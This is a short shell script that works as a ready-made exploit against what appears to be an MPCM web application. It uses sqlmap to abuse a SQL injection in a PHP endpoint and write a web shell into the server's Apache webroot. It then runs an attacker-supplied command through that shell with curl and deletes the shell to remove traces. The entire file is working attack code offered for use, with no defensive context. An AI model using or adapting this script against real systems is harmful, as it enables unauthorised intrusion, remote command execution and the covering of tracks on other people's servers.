echo "Using sql inejction to upload file"
sqlmap -u "$1/MPCM/WEB/realTimeMessageResponse.php?nummessage=123&fromserver=123" --file-write=./test.php --file-dest=C:\\MAXXING\\Apache\\htdocs\\MPCM\\WEB\\hh.php --batch > /dev/null
echo "Executing $2"
curl -sk "$1/MPCM/WEB/hh.php?test=$2"
echo ""
echo "Cleaning.."
curl -sk "$1/MPCM/WEB/hh.php?test=del%20hh.php" > /dev/null
